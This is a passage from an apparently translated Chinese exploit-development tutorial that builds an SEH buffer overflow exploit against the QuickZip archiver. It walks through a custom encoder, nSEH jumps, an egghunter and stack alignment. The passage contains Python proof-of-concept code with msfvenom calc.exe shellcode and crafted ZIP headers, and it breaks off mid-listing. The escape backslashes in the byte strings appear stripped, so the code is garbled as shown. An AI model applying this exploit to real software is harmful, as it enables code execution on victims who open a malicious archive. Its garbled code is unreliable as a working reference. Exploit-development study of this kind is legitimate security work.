    payload += "x05x10x11x10x11"   # add eax, 0x11101110
    payload += "x50"                   # push eax;
                                        # Zero-out EAX
    payload += "x25x01x01x01x01"   # and eax,0x01010101
    payload += "x25x10x10x10x10"   # and eax,0x10101010
                                           # write 0xef2d5854 into EAX
    payload += "x05x43x47x1cx77"   # add eax, 0x771c4743
    payload += "x05x10x10x01x77"   # add eax, 0x77011010
    payload += "x05x01x01x10x01"   # add eax, 0x01100101
    payload += "x50"                   # push eax;
    payload += "A" * (nseh_offset - len(payload))       # padding for the rest of the encoder
    payload += "x71x9bx70x9b"       # nSEH: jno $-99; jo $-99   => '9b' will actually be converted to 'a2', which is $-92
    payload += "x33x28x42x00"       # SEH
    #...snip...
一旦执行，会发生以下情况：
**崩溃被触发**
**POP-POP-RET指令被调用**
**获得JNO $ -92的跳转地址**
**从头开始执行自定义编码器**
**代码最终将到达第3步中跳转的JNO指令**
**再次取得JNO的跳转地址，但这次，我们登陆的第一条指令是刚刚写入的16个字节的跳转指令**
**获取跳转指令的跳转地址**
**使用自定义编码器写入要执行的指令**
我们来看看到底发生了什么。
执行自定义的编码器后：
取得JMP的跳转地址
在写入指令之前登陆，准备执行
真棒，正是我们期待的！ 现在我们只需要弄清楚用什么值替代0xDEADBEEF就可以了！
让我们来计算一下——ESP的当前值是0x0018FB4E，而egghunter代码从0x0018FA90开始，这意味着我们需要将EAX减去0xBE，让EAX指向我们的目的地。
我们开始修改漏洞利用代码，这里不是从EAX中减去0xDEADBEEF，而是减去0xBE。 PoC应进行以下修改：
    # Zero-out EAX
    payload += "x25x01x01x01x01"   # and eax,0x01010101
    payload += "x25x10x10x10x10"   # and eax,0x10101010
                                           # write 0xff000000 into EAX
    payload += "x05x01x01x01x77"   # add eax, 0x77010101
    payload += "x05x01x01x01x77"   # add eax, 0x77010101
    payload += "x05x10x10x10x22"   # add eax, 0x22101010
    payload += "x2dx12x12x12x11"   # sub eax, 0x11121212
    payload += "x50"                   # push eax;
                                        # Zero-out EAX
    payload += "x25x01x01x01x01"   # and eax,0x01010101
    payload += "x25x10x10x10x10"   # and eax,0x10101010
                                           # write 0xbe2d5854 into EAX
    payload += "x05x43x47x1cx67"   # add eax, 0x671c4743
    payload += "x05x11x11x11x57"   # add eax, 0x57111111
    payload += "x50"                   # push eax;
让我们来看看它会把我们带到哪里去。
真棒！我们跳转到了eghunter。现在，可以轻松插入选择的shellcode，并让egghunter找到它了。
我们来运行！mona findmsp，以防止我们的有效载荷仍然在内存中…
什么？！它消失了！去哪儿了？发生了什么？那些工作都白做了吗???
Ok，我知道咋回事。我们在自定义编码例程的开头部分添加的指令损坏了有效载荷，并导致我们的shellcode消失。出问题的指令是POP ESP（
x5c）——从前的同一个字节会让我们的文件名被解释为一个目录！
我花了很多时间思考、调试，并试图找出一个不会损坏有效载荷的替代方案，但没有成功。在使用有效字符集的情况下，事情根本没那么简单。
但是，还是有一个解决方案！也许不是很理想，但毕竟有办法了。看看我们的漏洞利用代码中的下面一行：
    exploit = header_1 + payload + header_2 + payload + header_3
如果在header_3之后再次添加有效载荷，如何？ 这基本上就是在ZIP文件的末尾附加一些垃圾，但它仍然可以工作。
将该行做如下修改，并用QuickZip打开它。
    exploit = header_1 + payload + header_2 + payload + header_3 + payload
有一个警告指出在文件末尾有一些垃圾，但没关系，因为仍然可以成功打开该文件。
让我们触发崩溃，看看这一次我们是否可以在内存中找到这个模版。
我的天哪，它就在那里！！！
**Shellcode**
现在，我们只需安装常规流程来处理一下shellcode就行了——我们需要找出坏字符，然后在shellcode之前插入一个“egg”（w00tw00t）并对齐堆栈。
我不会详细介绍寻找坏字符的细枝末节，因为我已经在这里详细介绍过了。 幸运的是，对于我们来说，这部分有效负载中仅有的坏字符是 x00， x0a和 x0d。
我们还需要在shellcode的开头插入w00tw00t字符，以确保egghunter可以定位它，并将执行权重定向到“egg”之后的第一个指令。
最后，我们需要对齐堆栈，以确保ESP指向一个16字节倍数的地址。
这样做的原因是有一些“SIMD”（单指令，多数据）指令可以并行处理内存中的多个字，所以要求这些字的起始地址是16字节的倍数。
如果我们没有正确对齐堆栈，那么shellcode根本不起作用。 我们可以轻松地利用单个指令AND
esp，0xFFFFFFF0来对齐堆栈，也就是让它正好在w00tw00t“蛋”之后，在实际shellcode之前。
对于这个概念验证来说，我们将使用msfvenom生成一个简单的、弹出计算器的shellcode，具体如下所示：
    shellcode = "w00tw00t"                     # egg
    shellcode += "x81xe4xf0xffxffxff"    # align the stack: AND esp,0xFFFFFFF0
    # msfvenom -p windows/exec CMD=calc.exe -b 'x00x0ax0d'
    # [*] x86/shikata_ga_nai succeeded with size 227 (iteration=1)
    shellcode += ("xbfxdcxaex26x3dxdaxddxd9x74x24xf4x5bx31xc9"
    "xb1x33x31x7bx12x03x7bx12x83x37x52xc4xc8x3b"
    "x43x80x33xc3x94xf3xbax26xa5x21xd8x23x94xf5"
    "xaax61x15x7dxfex91xaexf3xd7x96x07xb9x01x99"
    "x98x0fx8ex75x5ax11x72x87x8fxf1x4bx48xc2xf0"
    "x8cxb4x2dxa0x45xb3x9cx55xe1x81x1cx57x25x8e"
    "x1dx2fx40x50xe9x85x4bx80x42x91x04x38xe8xfd"
    "xb4x39x3dx1ex88x70x4axd5x7ax83x9ax27x82xb2"
    "xe2xe4xbdx7bxefxf5xfaxbbx10x80xf0xb8xadx93"
    "xc2xc3x69x11xd7x63xf9x81x33x92x2ex57xb7x98"
    "x9bx13x9fxbcx1axf7xabxb8x97xf6x7bx49xe3xdc"
    "x5fx12xb7x7dxf9xfex16x81x19xa6xc7x27x51x44"
    "x13x51x38x02xe2xd3x46x6bxe4xebx48xdbx8dxda"
    "xc3xb4xcaxe2x01xf1x25xa9x08x53xaex74xd9xe6"
    "xb3x86x37x24xcax04xb2xd4x29x14xb7xd1x76x92"
    "x2bxabxe7x77x4cx18x07x52x2fxffx9bx3ex9ex9a"
    "x1bxa4xde")
而涵盖迄今所讨论的所有内容的PoC代码如下所示：
    #!/usr/bin/python
    header_1 = ("x50x4Bx03x04x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
    "x00x00x00x00x00x00x00x00xe4x0fx00x00x00")
    header_2 = ("x50x4Bx01x02x14x00x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
    "x00x00x00x00x00x00x00x00x00xe4x0fx00x00x00x00x00x00x01x00"
    "x24x00x00x00x00x00x00x00")
    header_3 = ("x50x4Bx05x06x00x00x00x00x01x00x01x00"
    "x12x10x00x00x02x10x00x00x00x00")